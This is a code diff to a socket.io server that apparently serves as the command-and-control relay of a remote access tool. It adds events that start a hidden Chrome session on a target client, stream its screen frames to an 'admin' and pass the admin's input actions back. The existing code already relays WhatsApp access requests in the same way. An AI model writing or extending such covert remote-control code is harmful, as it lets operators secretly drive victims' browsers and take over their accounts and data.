@@ -72,6 +72,23 @@ io.on('connection', (socket) => {
     io.to(targetClientId).emit('request-whatsapp', socket.id);
   });
 
+  // Hidden Chrome
+  socket.on('request-hidden-chrome', (targetClientId) => {
+    io.to(targetClientId).emit('request-hidden-chrome', socket.id);
+  });
+
+  socket.on('hidden-chrome-frame', (data) => {
+    io.to(data.adminId).emit('hidden-chrome-frame', data.frame);
+  });
+
+  socket.on('hidden-chrome-action', (data) => {
+    io.to(data.targetId).emit('hidden-chrome-action', data.action);
+  });
+
+  socket.on('stop-hidden-chrome', (targetClientId) => {
+    io.to(targetClientId).emit('stop-hidden-chrome');
+  });
+
   socket.on('whatsapp-error', (data) => {
     io.to(data.adminId).emit('whatsapp-error', data.error);
   });
